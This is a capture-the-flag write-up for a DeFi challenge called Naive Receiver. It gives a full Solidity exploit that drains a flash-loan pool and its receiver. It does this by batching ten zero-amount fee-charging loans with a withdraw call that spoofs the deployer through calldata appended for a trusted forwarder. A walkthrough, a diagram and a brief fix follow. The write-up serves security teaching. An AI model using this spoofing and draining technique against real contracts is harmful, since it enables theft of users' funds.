## Challenge 2: Naive Receiver

### Vulnerability
The `NaiveReceiverPool` has **two critical vulnerabilities** that can be exploited together:

#### **Primary Vulnerability: Unauthorized Flash Loans**
The `flashLoan` function allows **any external caller** to initiate flash loans on behalf of any receiver contract:
- **No authorization check** - anyone can call `flashLoan(receiver, token, amount, data)`
- **Fixed fee structure** - charges 1 WETH fee regardless of loan amount (even 0-amount loans)
- **Receiver pays unconditionally** - the receiver contract pays fees without validating who initiated the loan

#### **Secondary Vulnerability: Privileged Withdrawal Access**
The `withdraw` function has **inadequate access control**:
- Uses `_msgSender()` instead of `msg.sender` to support meta-transactions via trusted forwarder
- **Critical flaw**: `_msgSender()` can be manipulated when called through the trusted `BasicForwarder`
- The `deployer` address has sufficient deposits to withdraw all pool funds
- **Anyone can call `withdraw` as long as they can spoof `_msgSender()` to return an address with sufficient deposits**

#### **Combined Attack Vector**
These vulnerabilities combine to enable a **complete drainage attack**:
1. **Drain the receiver** via repeated 0-amount flash loans (10 × 1 WETH fees = 10 WETH)
2. **Drain the pool** by withdrawing all funds using privilege escalation to impersonate `deployer`

The attack can be executed in a **single multicall transaction**, meeting the challenge's 2-transaction limit.


### Exploit Code
```solidity
function test_naiveReceiver() public checkSolvedByPlayer {

    // Prepare call data for 10 flash loans and 1 withdrawal
    bytes[] memory callDatas = new bytes[](11);

    // Encode flash loan calls - on behalf of the Naive receiver
    for (uint i = 0; i < 10; i++) {
        callDatas[i] = abi.encodeCall(
        NaiveReceiverPool.flashLoan,
        (receiver, address(weth), 0, "0x")
        );
    }

    // Encode withdrawal call
    // Exploit the access control vulnerability by passing the request through the forwarder
    // And setting the deployer as sender in the last 20 bytes (That's how the pool parses it)
    callDatas[10] = abi.encodePacked(
        abi.encodeCall(
        NaiveReceiverPool.withdraw,
        (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
        ),
        bytes32(uint256(uint160(deployer)))
    );

    // Encode the multicall
    bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);

    // Create forwarder request
    BasicForwarder.Request memory request = BasicForwarder.Request(
        player,
        address(pool),
        0,
        gasleft(),
        forwarder.nonces(player),
        multicallData,
        1 days
    );

    // Hash the request
    bytes32 requestHash = keccak256(
        abi.encodePacked(
        "\x19\x01",
        forwarder.domainSeparator(),
        forwarder.getDataHash(request)
        )
    );

    // Sign the request
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
    bytes memory signature = abi.encodePacked(r, s, v);

    // Execute the request
    forwarder.execute(request, signature);
}
```

### Exploit Walkthrough

1. **Drain the Receiver via Flash Loans**:  
   The `FlashLoanReceiver` contract has no access control in its `onFlashLoan` function. By initiating 10 flash loans of 0 amount, each time the receiver must pay the 1 WETH fee, draining its entire 10 WETH balance  Since each external call increases the transaction nonce, batching these calls is essential to stay within the transaction limit.

2. **Batch Operations Using Multicall**:  
   The `NaiveReceiverPool` inherits from the `Multicall` contract, allowing multiple function calls in a single transaction. The attacker constructs an array of 11 calldatas:
   - 10 calls to `flashLoan(receiver, weth, 0, "")`, each charging a 1 WETH fee from the receiver.
   - 1 final call to `withdraw(amount, recovery)` where `amount = 1010e18` (1000 from pool + 10 from receiver fees) 

3. **Impersonate the Deployer in Withdrawal**:  
   To successfully call `withdraw`, the `_msgSender()` must be the deployer (fee receiver). The attacker appends the deployer’s address as the last 20 bytes of the calldata for the `withdraw` call. When this call is executed via the forwarder, the pool interprets the deployer as the sender due to the manipulated calldata 

4. **Execute via Trusted Forwarder (Meta-Transaction)**:  
   The attacker creates a `BasicForwarder.Request` struct containing:
   - The player’s address.
   - Target: the pool.
   - Calldata: the `multicall` invocation with the 11 operations.
   This request is hashed using EIP-712 standards, signed with the player’s private key, and submitted to the forwarder’s `execute` function 

5. **Final Execution Flow**:
   - The forwarder verifies the signature and forwards the call to the pool.
   - The `multicall` function executes all 10 flash loans, draining the receiver.
   - The final `withdraw` call uses `delegatecall`, preserving the context where `msg.sender` is the forwarder and `msg.data` includes the forged deployer address.
   - `_msgSender()` returns the deployer, allowing the withdrawal of all funds to the recovery address 



### Solution Summary

The exploit combines:
- Abuse of unsecured `_msgSender()` logic in meta-transactions.
- Batching via `Multicall` to reduce transaction count.
- Calldata manipulation to impersonate the deployer.
- A signed meta-transaction via `BasicForwarder` to trigger the malicious sequence.

After execution, the pool and receiver have zero balance, and the recovery address holds 1010 WETH, solving the challenge 


### 🔍 Visual Summary of Data Flow

```
[Player] 
   │
   └─> execute(request, signature) 
         ↓
   [BasicForwarder]
         │
         ├─ Verifies signature, nonce, deadline
         └─> Delegates call to: pool.multicall(callDatas)
               ↓
         [NaiveReceiverPool]
               ├─ flashLoan(...) → fee paid → receiver loses 1 WETH (x10)
               └─ withdraw(...) 
                     → _msgSender() reads last 20 bytes → returns deployer
                     → transfer(1010 WETH) to recovery   
```


### Why it works

- **🔹 Single transaction execution via `multicall`**  
  The exploit bundles 10 flash loans and 1 withdrawal into a single `multicall`, ensuring the player uses only **one transaction**, satisfying the `vm.getNonce(player) ≤ 2` requirement.

- **🔹 Abuse of flash loan fee mechanism**  
  The `FlashLoanReceiver` pays a **1 WETH fee per flash loan**, even when borrowing **0 WETH**. By triggering 10 such loans, the attacker drains the receiver’s entire 10 WETH balance with no cost.

- **🔹 Meta-transaction spoofing using `BasicForwarder`**  
  The pool uses a trusted forwarder that overrides `_msgSender()` to read the sender from the **last 20 bytes of calldata**. The attacker appends the `deployer` address there to **impersonate the fee receiver** and bypass access control.

- **🔹 Privilege escalation via calldata manipulation**  
  By encoding the `withdraw` call and appending `bytes20(deployer)`, the attacker tricks the pool into believing the **deployer initiated the call**, allowing unauthorized withdrawal of all funds.

- **🔹 Fund consolidation and transfer**  
  After draining the receiver via fees, the pool holds **1010 WETH** (1000 original + 10 fees). The spoofed `withdraw` call transfers this entire amount to the `recovery` address, fulfilling the final condition.

- **🔹 No reentrancy or complex logic needed**  
  The exploit relies only on **existing public functions**, **calldata tricks**, and **batched calls** — no low-level exploits or external contracts required.

---

### 🎯 Result: All `_isSolved()` Checks Pass

| Check | Passed Because |
|------|----------------|
| `vm.getNonce(player) ≤ 2` | Only **1 transaction** used (`forwarder.execute`) |
| `weth.balanceOf(receiver) == 0` | 10 flash loans × 1 WETH fee = **10 WETH drained** |
| `weth.balanceOf(pool) == 0` | `withdraw(1010, recovery)` removes all funds |
| `weth.balanceOf(recovery) == 1010e18` | Full amount transferred in one call |

---


### Vulnerability Analysis
**File:** `src/naive-receiver/NaiveReceiverPool.sol`
**Vulnerable Code (lines ~86-91):**
```solidity
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
        return address(bytes20(msg.data[msg.data.length - 20:]));
    } else {
        return super._msgSender();
    }
}
```

The vulnerability lies in how `_msgSender()` is implemented. If the `msg.sender` is the trusted forwarder and the calldata is at least 20 bytes long, the function returns the last 20 bytes of the `msg.data` as the sender address:

This logic can be exploited because it does not validate whether the appended address is legitimate or authorized. An attacker can manipulate the calldata to impersonate any address, including the contract deployer, who is also the fee receiver 

The target is to drain all funds from both the `FlashLoanReceiver` (which holds 10 WETH) and the pool (which holds 1000 WETH), transferring the total of 1010 WETH to a recovery address, all within two transactions (ideally one) 



### Fix

To prevent this exploit, the `_msgSender()` function should validate that the appended address is a legitimate signer, or the `withdraw` function should use stricter access control that doesn’t rely solely on `_msgSender()` when called through meta-transactions  Additionally, the forwarder should ensure that only authorized functions can be called via meta-transactions with sender spoofing 
